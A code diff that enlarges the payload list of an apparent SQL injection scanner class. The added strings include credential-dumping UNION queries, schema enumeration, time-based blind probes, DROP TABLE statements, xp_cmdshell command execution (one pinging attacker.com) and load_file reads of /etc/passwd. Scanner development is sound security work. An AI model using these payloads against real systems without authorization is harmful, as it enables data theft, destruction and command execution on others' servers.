@@ -100,10 +100,39 @@ class SqlScan:
         parsed_url = urlparse(url)
         query = parse_qs(parsed_url.query)
         payloads = [
-            "'", "' OR '1'='1", "' AND '1'='2", "' OR 'x'='x", "';--",
-            "') OR ('1'='1", "' UNION SELECT NULL, NULL, NULL--", "'; DROP TABLE users;--",
-            "' OR '1'='1' /*", "' OR '1'='1' -- "
-        ]
+    "'", "' OR '1'='1", "' AND '1'='2", "' OR 'x'='x", "';--", 
+    "') OR ('1'='1", "' UNION SELECT NULL, NULL, NULL--", "'; DROP TABLE users;--",
+    "' OR '1'='1' /*", "' OR '1'='1' --", "' OR '1'='1' #", "' AND 1=1--", 
+    "' AND 1=2--", "' OR 1=1--", "' OR 1=2--", "' OR 1=1; WAITFOR DELAY '00:00:05'--",
+    "' OR 1=1; SLEEP(5)--", "' OR 1=1; BENCHMARK(1000000, MD5(123))--", 
+    "' UNION SELECT 1, username, password FROM users--", 
+    "' UNION SELECT null, table_name FROM information_schema.tables--", 
+    "' UNION SELECT null, column_name FROM information_schema.columns WHERE table_name='users'--", 
+    "' OR 1=1; EXEC xp_cmdshell('nslookup example.com')--", 
+    "' OR 1=1; EXEC xp_cmdshell('ping -n 5 attacker.com')--", 
+    "' UNION ALL SELECT 1, 2, GROUP_CONCAT(table_name), 4 FROM information_schema.tables--", 
+    "' UNION ALL SELECT 1, 2, GROUP_CONCAT(column_name), 4 FROM information_schema.columns WHERE table_name='users'--", 
+    "'; EXEC xp_cmdshell('dir')--", "'; EXEC xp_cmdshell('net user')--", 
+    "'; EXEC xp_cmdshell('netstat -ano')--", "'; EXEC xp_cmdshell('id')--", 
+    "' OR '' = '", "' OR 1=1 --", "' OR 1=1#", "' OR 1=1--", 
+    "1' AND 1=1--", "1' OR 1=1--", "1' AND 1=2--", "id=1' OR 1=1--", 
+    "user=admin' OR 1=1--", "uid=' UNION SELECT NULL, user, password FROM users--", 
+    "1' OR '1'='1' --", "1' AND '1'='1' --", "username=' OR 1=1 --", 
+    "password=' UNION SELECT NULL, username, password FROM users--", 
+    "' UNION SELECT 1, 'test', 'test' --", "' UNION SELECT 1, 2, 3, 4, 5 --", 
+    "' OR CAST(1 AS INT) = CAST(1 AS INT)--", "' OR 'a'='a' --", 
+    "' OR LENGTH('test') = 4--", "' OR 1=1 GROUP BY CONCAT(0x3a, database(), 0x3a)--", 
+    "' AND 1=2 GROUP BY CONCAT(0x3a, table_name, 0x3a)--", 
+    "' AND 1=2 GROUP BY CONCAT(0x3a, column_name, 0x3a)--", "--", "#", "; --", 
+    "1' HAVING 1=1--", "1' HAVING 1=2--", "'; EXECUTE IMMEDIATE 'DROP TABLE users'--", 
+    "'; EXECUTE IMMEDIATE 'SELECT * FROM sensitive_data'--", 
+    "'; EXECUTE IMMEDIATE 'SELECT @@version'--", "'; EXECUTE IMMEDIATE 'SHOW TABLES'--", 
+    "' OR 1=1#", "' OR 'x'='x' /*", "' OR 1=1; --", "' AND 1=1; --", 
+    "1' AND 1=1 /*", "'; EXEC xp_cmdshell 'net user' --", 
+    "' UNION SELECT 1, load_file('/etc/passwd')--", 
+    "' UNION SELECT 1, load_file('C:\\Windows\\System32\\drivers\\etc\\hosts')--"
+]
+
 
         for param, original_values in query.items():
             for original_value in original_values:
